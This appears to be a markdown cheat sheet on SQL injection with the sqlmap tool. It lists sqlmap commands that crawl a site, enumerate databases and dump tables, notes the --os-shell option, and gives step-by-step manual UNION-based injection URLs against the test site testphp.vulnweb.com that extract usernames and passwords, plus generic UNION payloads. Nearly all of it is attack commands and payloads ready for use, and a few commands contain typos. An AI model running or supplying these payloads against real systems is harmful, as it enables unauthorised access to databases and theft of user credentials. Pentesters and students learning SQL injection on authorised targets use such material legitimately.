# SQLmap
 SQL is a standard language for accessing and manipulating databases.
     SQL stands for Structured Query Language
    SQL lets you access and manipulate databases
    SQL became a standard of the American National Standards Institute (ANSI) in 1986, and of the International Organization for Standardization (ISO) in 1987
 
# Overview 

- Techniques     |     -u        
- Crawl         |     --forms
- Enumeration   |     --data
- Batch         |     --headers
- Risk          |     --user-agent
- Level         |     --cookie
- Threads       |     --flush-session
- Verbosity     |     --output-dir
- Proxy         |     --tamper
- SQL Injection Via Burp-Suite

# Techniques 

* B: Boolean-based blind
* E: Error-based
* U: Union query-based
* S: Stacked queries 
* T: Time-based blind
* Q: Inline queries 
   --technique-"B"

# Crawl

* Depth 1: http://www.example.com/news
* Depth 2: http://www.example.com/news/newest/
* Depth 3: http://www.example.com/news/newest/terror/
* Depth 4: http://www.example.com/news/newest/terror/country/
     --crawl 3
     
# Verbosity
* 0: show only python tracebacks, error and critical messages.
* 1: show also information and warning messages.
* 2: show also debug messages.
* 3: show also payloads injected.
* 4: show also HTTP requests.
* 5: show also HTTP responses'headers.
* 6: show also HTTP responses'page content
     
# Kali linux   ( command ) 

1.  sqlmap -u http://www.example.com/ --crawl 2 
2.  sqlmap -u http://www.example.com/ --crawl 3 --batch 
3.  sqlmap -u http://www.example.com/ --crawl 3 --technigue="U"                ( U = union )
4.  sqlmap -u http://www.example.com/ --crawl 2 --batch --threads 5            ( 1 to 10 )
5.  sqlmap -u http://www.example.com/ --crawl 2 --batch --risk 2               ( 1 to 3 )
6.  sqlmap -u http://www.example.com/ --crawl 2 --batch --level 1              ( 1 to 5 )
7.  sqlmap -u http://www.example.com/ --crawl 3 --batch -v 4                   ( 0 to 6 )
8.  sqlmap -u http://www.example.com/listproducts.php?cat=? --current-user --current-db --hostname --batch     ( vulnerable website link )
9.  sqlmap -u http://www.example.com/listproducts.php?cat=? --dbs              ( all data base details )
10. sqlmap -u http://www.example.com/listproducts.php?cat=? -D ( avl. database name ) --tables 
11. sqlmap -u http://www.example.com/listproducts.php?cat=? -D ( avl. database name ) -T ( avl. tables name ) --dump
12. sqlmap -u http://www.example.com/listproducts.php?cat=? -D ( avl. database name ) -T ( avl. tables name ) --columns 
13. sqlmap -u http://www.example.com/listproducts.php?cat=? -D ( avl. database name ) --dump-all
14. sqlmap -u http://www.example.com/ --crawl 2 --output-dir="home/ghost/desktop/sql/" --batch
15. sqlmap -u http://www.example.com/ --crawl 2 --headers="Referer:abc.com" -v 4 --batch
16. sqlmap -u http://www.example.com/ --crawl 2 --user-agent="GECKO_CHROME" -v 4 --batch
17. sqlmap -u http://www.example.com/ --crawl 2 --mobile -v 4 
18. sqlmap --list-tempers
19. sqlmap -u http://www.example.com/ --crawl 2 --tamper=base64encode -v 3 --batch

# BRUTE FORCE LOGIN PAGE
* first we need url of login page 
* than we need username && password && login we need to find the value of username , password , login [ by using inspect ].
* for eg username value is going with uname && password value is going with pass && login value is going with submit.
* also we need to check the username && password && login case value is going with userinfo.php 
* sqlmap -u http://www.example.com/login.php --forms         (next step first cat the sql save data)
* sqlmap -u http://www.example.com/userinfo.php --data="uname=abc&pass=abc&login=submit" --dbs

# PROXY
* sqlmap -u http://www.example.com/ --crawl 2 --proxy="127.0.0.1:8080"      ( then go to burp suite )

# Highlights
* --cookie
* --flush-session
* --comment
* --os-shell
* --os-cmd

# Manually 
1. http://testphp.vulnweb.com/
2. http://testphp.vulnweb.com/listproducts.php?cat=1'           ( we use malicious payload )
3. http://testphp.vulnweb.com/listproducts.php?cat=1 order by 11--+
4. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,9,10,11--+
5. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,7,8,9,10,11--+
6. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,7,8,version(),10,11--+
7. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,table_name,8,version(),10,11 from information_schema.tables--+
8. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,column_name,8,version(),10,11 from information_schema.columns where table_name="users"--+
9. http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,database(),3,4,5,6,group_concat(uname,pass),8,version(),10,11 from users--+


eg :-)

1. ' union select username, password from users--+
2. '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
3. '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--





